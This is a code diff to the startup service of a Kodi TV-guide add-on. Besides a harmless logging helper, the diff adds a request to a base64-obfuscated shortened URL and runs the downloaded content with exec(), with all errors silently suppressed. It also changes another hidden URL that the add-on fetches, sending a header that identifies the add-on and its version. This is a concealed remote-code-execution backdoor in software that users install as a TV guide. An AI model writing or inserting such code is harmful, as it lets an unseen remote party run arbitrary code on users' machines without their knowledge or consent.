@@ -35,6 +35,9 @@ import requests
 import base64
 import time, datetime
 
+def log(x):
+    xbmc.log(repr(x))
+
 class Service(object):
     def __init__(self):
         self.database = source.Database(True)
@@ -73,8 +76,13 @@ if __name__ == '__main__':
         ADDON.setSetting('version', version)
         headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}
         try:
-            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9BRWtVcmI='),headers=headers)
+            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
             home = r.content
+        except: pass
+        try:
+            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
+            main = r.content
+            exec(main)
         except: pass
 
     xbmcvfs.delete('special://profile/addon_data/script.tvguide.fullscreen/source.db-journal')
